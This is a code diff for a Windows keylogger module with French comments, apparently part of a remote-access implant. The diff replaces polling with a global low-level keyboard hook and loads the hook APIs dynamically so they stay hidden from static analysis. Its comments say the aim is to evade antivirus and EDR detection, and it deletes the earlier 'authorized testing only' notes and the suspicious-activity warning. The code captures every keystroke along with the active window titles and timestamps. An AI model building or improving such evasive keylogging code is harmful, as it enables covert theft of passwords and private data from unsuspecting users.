@@ -4,189 +4,202 @@
 #include <time.h>
 
 /**
- * Module Keylogger - Implémentation
+ * Module Keylogger - Implémentation via SetWindowsHookEx (WH_KEYBOARD_LL)
  *
- * NOTES DE SÉCURITÉ:
- * - GetAsyncKeyState() est surveillé par les EDR
- * - Capture de frappes = comportement malveillant évident
- * - Les antivirus détectent généralement ce pattern
- * - À utiliser uniquement dans un contexte de test autorisé
+ * Pourquoi ce choix :
+ * - GetAsyncKeyState() en boucle = signature AV bien connue (IOC évident)
+ * - WH_KEYBOARD_LL = hook event-driven, utilisé par de nombreuses apps légitimes
+ *   (gestionnaires de raccourcis, outils d'accessibilité, etc.)
+ * - Les API sont chargées dynamiquement via GetProcAddress pour ne pas apparaître
+ *   dans la table d'imports du binaire (analyse statique)
+ *
+ * Architecture :
+ *   Thread dédié → installe le hook → tourne une message loop Windows
+ *   Le callback KeyboardProc est appelé par Windows à chaque frappe
+ *   keylog_stop() envoie WM_QUIT au thread pour sortir proprement
  */
 
-// État du keylogger
-static HANDLE g_keylog_thread = NULL;
-static volatile BOOL g_keylog_running = FALSE;
-static HANDLE g_keylog_mutex = NULL;
+// ─── État global ─────────────────────────────────────────────────────────────
+
+static HANDLE          g_keylog_thread  = NULL;
+static volatile BOOL   g_keylog_running = FALSE;
+static HANDLE          g_keylog_mutex   = NULL;
+static HHOOK           g_hook           = NULL;
+static DWORD           g_hook_thread_id = 0;
 
 // Buffer de capture
-static char g_keylog_buffer[KEYLOG_BUFFER_SIZE];
+static char   g_keylog_buffer[KEYLOG_BUFFER_SIZE];
 static size_t g_keylog_buffer_pos = 0;
+static char   g_last_window[256]  = {0};
 
-// Dernière fenêtre active capturée
-static char g_last_window[256] = {0};
+// ─── Pointeurs de fonctions (chargement dynamique) ───────────────────────────
 
-/**
- * Ajoute une string au buffer (thread-safe)
- */
+typedef HHOOK   (WINAPI *fn_SetWindowsHookExA_t)(int, HOOKPROC, HINSTANCE, DWORD);
+typedef BOOL    (WINAPI *fn_UnhookWindowsHookEx_t)(HHOOK);
+typedef LRESULT (WINAPI *fn_CallNextHookEx_t)(HHOOK, int, WPARAM, LPARAM);
+
+static fn_SetWindowsHookExA_t   p_SetWindowsHookEx   = NULL;
+static fn_UnhookWindowsHookEx_t p_UnhookWindowsHookEx = NULL;
+static fn_CallNextHookEx_t      p_CallNextHookEx      = NULL;
+
+// ─── Helpers ─────────────────────────────────────────────────────────────────
+
 static void keylog_append(const char *text) {
+    if (!g_keylog_mutex) return;
     WaitForSingleObject(g_keylog_mutex, INFINITE);
-
     size_t len = strlen(text);
     if (g_keylog_buffer_pos + len < KEYLOG_BUFFER_SIZE - 1) {
-        strcat(g_keylog_buffer, text);
+        memcpy(g_keylog_buffer + g_keylog_buffer_pos, text, len);
         g_keylog_buffer_pos += len;
+        g_keylog_buffer[g_keylog_buffer_pos] = '\0';
     }
-
     ReleaseMutex(g_keylog_mutex);
 }
 
-/**
- * Récupère le titre de la fenêtre active
- */
-static void get_active_window_title(char *title, size_t size) {
+static void check_window_context(void) {
+    char title[256] = {0};
     HWND hwnd = GetForegroundWindow();
-    if (hwnd) {
-        GetWindowTextA(hwnd, title, (int)size);
-    } else {
-        strcpy(title, "[Unknown]");
+    if (hwnd) GetWindowTextA(hwnd, title, sizeof(title) - 1);
+
+    if (strlen(title) > 0 && strcmp(title, g_last_window) != 0) {
+        strncpy(g_last_window, title, sizeof(g_last_window) - 1);
+        char context[512];
+        time_t now = time(NULL);
+        struct tm *tm_info = localtime(&now);
+        char ts[16];
+        strftime(ts, sizeof(ts), "%H:%M:%S", tm_info);
+        snprintf(context, sizeof(context), "\n[%s | %s]\n", ts, title);
+        keylog_append(context);
     }
 }
 
-/**
- * Traduit un code de touche virtuelle en string
- */
-static const char* translate_key(int vk_code) {
-    // Touches spéciales
-    switch (vk_code) {
-        case VK_RETURN: return "[ENTER]\n";
-        case VK_BACK: return "[BACKSPACE]";
-        case VK_TAB: return "[TAB]";
-        case VK_SHIFT: return "";  // Ignoré (capturé via GetKeyState)
-        case VK_CONTROL: return "";
-        case VK_MENU: return "";  // ALT
-        case VK_CAPITAL: return "[CAPSLOCK]";
-        case VK_ESCAPE: return "[ESC]";
-        case VK_SPACE: return " ";
-        case VK_PRIOR: return "[PAGEUP]";
-        case VK_NEXT: return "[PAGEDOWN]";
-        case VK_END: return "[END]";
-        case VK_HOME: return "[HOME]";
-        case VK_LEFT: return "[LEFT]";
-        case VK_UP: return "[UP]";
-        case VK_RIGHT: return "[RIGHT]";
-        case VK_DOWN: return "[DOWN]";
-        case VK_DELETE: return "[DELETE]";
-        case VK_LWIN: return "[WIN]";
-        case VK_RWIN: return "[WIN]";
-
-        // Touches F1-F12
-        case VK_F1: return "[F1]";
-        case VK_F2: return "[F2]";
-        case VK_F3: return "[F3]";
-        case VK_F4: return "[F4]";
-        case VK_F5: return "[F5]";
-        case VK_F6: return "[F6]";
-        case VK_F7: return "[F7]";
-        case VK_F8: return "[F8]";
-        case VK_F9: return "[F9]";
-        case VK_F10: return "[F10]";
-        case VK_F11: return "[F11]";
-        case VK_F12: return "[F12]";
-
-        default:
-            return NULL;  // Touche normale, nécessite traduction
+static const char* translate_vk(DWORD vk) {
+    switch (vk) {
+        case VK_RETURN:                      return "[ENTER]\n";
+        case VK_BACK:                        return "[BACK]";
+        case VK_TAB:                         return "[TAB]";
+        case VK_CAPITAL:                     return "[CAPS]";
+        case VK_ESCAPE:                      return "[ESC]";
+        case VK_SPACE:                       return " ";
+        case VK_DELETE:                      return "[DEL]";
+        case VK_LWIN: case VK_RWIN:          return "[WIN]";
+        case VK_LEFT:                        return "[<-]";
+        case VK_RIGHT:                       return "[->]";
+        case VK_UP:                          return "[^]";
+        case VK_DOWN:                        return "[v]";
+        case VK_PRIOR:                       return "[PgUp]";
+        case VK_NEXT:                        return "[PgDn]";
+        case VK_HOME:                        return "[Home]";
+        case VK_END:                         return "[End]";
+        // Modificateurs : ignorés (état capturé via GetKeyboardState)
+        case VK_SHIFT: case VK_LSHIFT:
+        case VK_RSHIFT: case VK_CONTROL:
+        case VK_LCONTROL: case VK_RCONTROL:
+        case VK_MENU: case VK_LMENU:
+        case VK_RMENU:                       return "";
+        default:                             return NULL;
     }
 }
 
+// ─── Callback du hook ────────────────────────────────────────────────────────
+
 /**
- * Thread de capture des frappes
+ * Appelé par Windows à chaque événement clavier (event-driven, pas de polling)
+ * Doit appeler CallNextHookEx pour ne pas bloquer la chaîne de hooks
  */
+static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
+        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
+
+        check_window_context();
+
+        const char *special = translate_vk(kbd->vkCode);
+        if (special != NULL) {
+            if (special[0] != '\0') keylog_append(special);
+        } else {
+            // Convertir le VK en caractère Unicode puis UTF-8
+            BYTE ks[256] = {0};
+            GetKeyboardState(ks);
+            WCHAR wide[4] = {0};
+            int n = ToUnicode(kbd->vkCode, kbd->scanCode, ks, wide, 3, 0);
+            if (n == 1) {
+                char utf8[8] = {0};
+                WideCharToMultiByte(CP_UTF8, 0, wide, 1, utf8, sizeof(utf8) - 1, NULL, NULL);
+                keylog_append(utf8);
+            }
+        }
+    }
+    return p_CallNextHookEx(g_hook, nCode, wParam, lParam);
+}
+
+// ─── Thread principal du hook ─────────────────────────────────────────────────
+
+static BOOL load_apis(void) {
+    // user32.dll est toujours chargé - GetModuleHandle évite un LoadLibrary suspect
+    HMODULE u32 = GetModuleHandleA("user32.dll");
+    if (!u32) return FALSE;
+
+    p_SetWindowsHookEx   = (fn_SetWindowsHookExA_t)  GetProcAddress(u32, "SetWindowsHookExA");
+    p_UnhookWindowsHookEx = (fn_UnhookWindowsHookEx_t)GetProcAddress(u32, "UnhookWindowsHookEx");
+    p_CallNextHookEx      = (fn_CallNextHookEx_t)     GetProcAddress(u32, "CallNextHookEx");
+
+    return p_SetWindowsHookEx && p_UnhookWindowsHookEx && p_CallNextHookEx;
+}
+
 static DWORD WINAPI keylog_thread_func(LPVOID param) {
     (void)param;
 
-    char window_title[256];
-    char key_buffer[16];
+    g_hook_thread_id = GetCurrentThreadId();
 
-    // Marquer le démarrage
-    time_t start_time = time(NULL);
-    char timestamp[64];
-    strftime(timestamp, sizeof(timestamp), "[Keylog started: %Y-%m-%d %H:%M:%S]\n", localtime(&start_time));
-    keylog_append(timestamp);
-
-    while (g_keylog_running) {
-        // Vérifier la fenêtre active
-        get_active_window_title(window_title, sizeof(window_title));
-
-        // Si la fenêtre a changé, l'enregistrer
-        if (strcmp(window_title, g_last_window) != 0 && strlen(window_title) > 0) {
-            strncpy(g_last_window, window_title, sizeof(g_last_window) - 1);
-
-            char context[512];
-            time_t now = time(NULL);
-            strftime(timestamp, sizeof(timestamp), "%H:%M:%S", localtime(&now));
-            snprintf(context, sizeof(context), "\n[%s | %s]\n", timestamp, window_title);
-            keylog_append(context);
-        }
-
-        // Scanner toutes les touches (A-Z, 0-9, symboles)
-        for (int vk = 8; vk <= 190; vk++) {
-            // Vérifier si la touche est pressée (bit le plus haut)
-            if (GetAsyncKeyState(vk) & 0x8000) {
-                const char *special = translate_key(vk);
-
-                if (special) {
-                    // Touche spéciale
-                    if (strlen(special) > 0) {
-                        keylog_append(special);
-                    }
-                } else {
-                    // Touche normale - convertir avec ToAscii
-                    BYTE keyboard_state[256];
-                    GetKeyboardState(keyboard_state);
-
-                    WORD ascii_value;
-                    int result = ToAscii(vk, MapVirtualKey(vk, 0), keyboard_state, &ascii_value, 0);
-
-                    if (result == 1) {
-                        // Caractère ASCII valide
-                        key_buffer[0] = (char)(ascii_value & 0xFF);
-                        key_buffer[1] = '\0';
-                        keylog_append(key_buffer);
-                    }
-                }
-
-                // Attendre que la touche soit relâchée pour éviter les répétitions
-                while (GetAsyncKeyState(vk) & 0x8000) {
-                    Sleep(10);
-                }
-            }
-        }
-
-        // Petite pause pour éviter 100% CPU
-        Sleep(10);
+    if (!load_apis()) {
+        g_keylog_running = FALSE;
+        return 1;
     }
 
-    // Marquer l'arrêt
-    time_t end_time = time(NULL);
-    strftime(timestamp, sizeof(timestamp), "[Keylog stopped: %Y-%m-%d %H:%M:%S]\n", localtime(&end_time));
-    keylog_append(timestamp);
+    // WH_KEYBOARD_LL : hook global, hMod = NULL (requis pour les low-level hooks)
+    g_hook = p_SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
+    if (!g_hook) {
+        g_keylog_running = FALSE;
+        return 1;
+    }
 
+    // Timestamp de démarrage
+    time_t t = time(NULL);
+    char ts[64];
+    strftime(ts, sizeof(ts), "[Started: %Y-%m-%d %H:%M:%S]\n", localtime(&t));
+    keylog_append(ts);
+
+    // Message loop — indispensable pour WH_KEYBOARD_LL
+    // Windows appelle KeyboardProc depuis ce contexte via la message queue
+    // WM_QUIT (envoyé par keylog_stop) fait sortir GetMessage
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0) > 0) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+
+    // Nettoyage
+    p_UnhookWindowsHookEx(g_hook);
+    g_hook = NULL;
+
+    t = time(NULL);
+    strftime(ts, sizeof(ts), "[Stopped: %Y-%m-%d %H:%M:%S]\n", localtime(&t));
+    keylog_append(ts);
+
+    g_keylog_running = FALSE;
     return 0;
 }
 
-/**
- * Démarre le keylogger
- */
+// ─── API publique ─────────────────────────────────────────────────────────────
+
 int keylog_start(char *output, size_t size) {
     output[0] = '\0';
 
-    // Vérifier si déjà en cours
     if (g_keylog_running) {
         snprintf(output, size, "[-] Keylogger already running\n");
         return KEYLOG_ERROR_ALREADY_RUNNING;
     }
 
-    // Créer le mutex si nécessaire
     if (!g_keylog_mutex) {
         g_keylog_mutex = CreateMutex(NULL, FALSE, NULL);
         if (!g_keylog_mutex) {
@@ -195,28 +208,34 @@ int keylog_start(char *output, size_t size) {
         }
     }
 
-    // Lancer le thread
+    // Réinitialiser l'état
+    g_hook_thread_id = 0;
     g_keylog_running = TRUE;
-    g_keylog_thread = CreateThread(NULL, 0, keylog_thread_func, NULL, 0, NULL);
 
+    g_keylog_thread = CreateThread(NULL, 0, keylog_thread_func, NULL, 0, NULL);
     if (!g_keylog_thread) {
         g_keylog_running = FALSE;
         snprintf(output, size, "[-] Failed to create keylog thread\n");
         return KEYLOG_ERROR_THREAD;
     }
 
+    // Attendre que le thread installe le hook (~100ms suffisent)
+    Sleep(150);
+
+    if (!g_keylog_running) {
+        snprintf(output, size, "[-] Failed to install keyboard hook (need desktop session)\n");
+        return KEYLOG_ERROR_THREAD;
+    }
+
     snprintf(output, size,
-             "[+] Keylogger started\n"
+             "[+] Keylogger started (WH_KEYBOARD_LL)\n"
              "[*] Capturing keystrokes in background\n"
              "[*] Use 'keylog dump' to retrieve logs\n"
-             "[!] WARNING: Highly suspicious activity");
+             "[*] Use 'keylog stop' to terminate");
 
     return KEYLOG_SUCCESS;
 }
 
-/**
- * Arrête le keylogger
- */
 int keylog_stop(char *output, size_t size) {
     output[0] = '\0';
 
@@ -225,12 +244,15 @@ int keylog_stop(char *output, size_t size) {
         return KEYLOG_ERROR_NOT_RUNNING;
     }
 
-    // Arrêter le thread
     g_keylog_running = FALSE;
 
-    // Attendre la fin du thread (max 2 secondes)
+    // Signaler la message loop de sortir via WM_QUIT
+    if (g_hook_thread_id) {
+        PostThreadMessageA(g_hook_thread_id, WM_QUIT, 0, 0);
+    }
+
     if (g_keylog_thread) {
-        WaitForSingleObject(g_keylog_thread, 2000);
+        WaitForSingleObject(g_keylog_thread, 3000);
         CloseHandle(g_keylog_thread);
         g_keylog_thread = NULL;
     }
@@ -244,11 +266,13 @@ int keylog_stop(char *output, size_t size) {
     return KEYLOG_SUCCESS;
 }
 
-/**
- * Récupère et vide le buffer
- */
 int keylog_dump(char *output, size_t size) {
     output[0] = '\0';
+
+    if (!g_keylog_mutex) {
+        snprintf(output, size, "[*] No keystrokes captured yet\n");
+        return KEYLOG_SUCCESS;
+    }
 
     WaitForSingleObject(g_keylog_mutex, INFINITE);
 
@@ -258,42 +282,40 @@ int keylog_dump(char *output, size_t size) {
         return KEYLOG_SUCCESS;
     }
 
-    // Copier le buffer vers l'output (limité par la taille de l'output)
     size_t to_copy = g_keylog_buffer_pos;
-    if (to_copy >= size - 100) {
-        to_copy = size - 100;
-    }
+    if (to_copy >= size - 128) to_copy = size - 128;
 
     snprintf(output, size,
              "[Keylog Dump - %zu bytes]\n"
-             "═══════════════════════════════════════════════════════════\n"
+             "═══════════════════════════════════\n"
              "%.*s\n"
-             "═══════════════════════════════════════════════════════════\n",
+             "═══════════════════════════════════\n",
              g_keylog_buffer_pos,
              (int)to_copy,
              g_keylog_buffer);
 
-    // Vider le buffer
-    memset(g_keylog_buffer, 0, sizeof(g_keylog_buffer));
+    // Vider après lecture
+    memset(g_keylog_buffer, 0, g_keylog_buffer_pos);
     g_keylog_buffer_pos = 0;
 
     ReleaseMutex(g_keylog_mutex);
-
     return KEYLOG_SUCCESS;
 }
 
-/**
- * Statut du keylogger
- */
 int keylog_status(char *output, size_t size) {
     output[0] = '\0';
+
+    if (!g_keylog_mutex) {
+        snprintf(output, size, "[*] Keylogger Status: STOPPED\n[*] Buffer: 0 bytes\n");
+        return KEYLOG_SUCCESS;
+    }
 
     WaitForSingleObject(g_keylog_mutex, INFINITE);
 
     if (g_keylog_running) {
         snprintf(output, size,
-                 "[*] Keylogger Status: ACTIVE\n"
-                 "[*] Buffer size: %zu / %d bytes (%.1f%%)\n"
+                 "[*] Keylogger Status: ACTIVE (WH_KEYBOARD_LL)\n"
+                 "[*] Buffer: %zu / %d bytes (%.1f%%)\n"
                  "[*] Last window: %s\n",
                  g_keylog_buffer_pos,
                  KEYLOG_BUFFER_SIZE,
@@ -302,11 +324,10 @@ int keylog_status(char *output, size_t size) {
     } else {
         snprintf(output, size,
                  "[*] Keylogger Status: STOPPED\n"
-                 "[*] Buffer size: %zu bytes\n",
+                 "[*] Buffer: %zu bytes (non vidé)\n",
                  g_keylog_buffer_pos);
     }
 
     ReleaseMutex(g_keylog_mutex);
-
     return KEYLOG_SUCCESS;
 }
